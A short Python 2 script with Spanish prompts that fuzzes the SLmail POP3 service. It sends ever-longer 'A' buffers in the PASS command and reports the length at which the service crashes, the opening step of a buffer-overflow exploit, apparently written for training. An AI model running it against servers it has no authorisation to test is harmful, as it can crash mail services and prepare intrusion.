import sys,socket
from time import sleep
puerto = 110
try:
    host = str(sys.argv[1])
    puerto = str(sys.argv[2])
except IndexError:
    print "USO : python %s <direccion_IP> <puerto>" %sys.argv[0]
    sys.exit()
bytes_fuzz = input("Introduce el valor inicial de bytes que quieres probar: ")
suma = input("Introduce el valor de bytes que se sumara al inicial por ciclo: ")
#host = input("Introduce el host el cual tiene SLmail instalado: "))
#puerto = input("Introduce el puerto en el cual esta POP3 SLmail corriendo (por defecto es el 21): ")
fin = input("Introduce el valor maximo de bytes que quieres que se fuzeen ")


while bytes_fuzz < fin:
    buffer = 'A'    
    buffer = buffer * bytes_fuzz
    print "Numero de bytes enviados: %s " % bytes_fuzz
    try:    
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,int(puerto)))
        s.recv(1024)
        s.send('USER Anon\r\n')
        s.recv(1023)
        s.send('PASS '+buffer+'\r\n' )
        s.send('QUIT\r\n')
        s.close()
        bytes_fuzz = bytes_fuzz + suma
    except:
        print ("Numero de bytes con los que ha crasheado: ") + str(bytes_fuzz)
        sys.exit()